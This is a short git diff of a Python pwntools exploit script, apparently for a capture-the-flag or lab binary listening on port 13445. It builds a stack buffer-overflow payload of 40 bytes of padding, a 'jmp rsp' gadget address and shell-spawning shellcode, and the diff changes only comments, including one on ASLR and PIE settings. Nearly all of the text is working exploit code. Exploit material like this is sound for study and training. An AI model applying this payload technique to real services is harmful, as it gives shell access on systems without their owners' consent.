@@ -10,6 +10,7 @@ PORT = 13445
 context.update(arch= 'amd64', os='linux')
 
 def make_payload():
+    #ALSR ON + PIE OFF
     #get assembly to open a shell
     shellcode = shellcraft.sh()
 
@@ -19,9 +20,10 @@ def make_payload():
     # Found via ROPgadget: 0x000000000040118d : jmp rsp
     jmp_rsp = 0x40118d
 
-    payload = b'A' * 40          # Fill buffer + RBP
-    payload += p64(jmp_rsp)      # Overwrite RET with address of 'jmp rsp'
-    payload += shellcode_b         # Shellcode at the top of the stack (after returning), pointed by RSP
+    # shellcode | ret | bp(8) | local variables (32)
+    payload = b'A' * 40          
+    payload += p64(jmp_rsp)     
+    payload += shellcode_b        
     
     #print(payload)
 
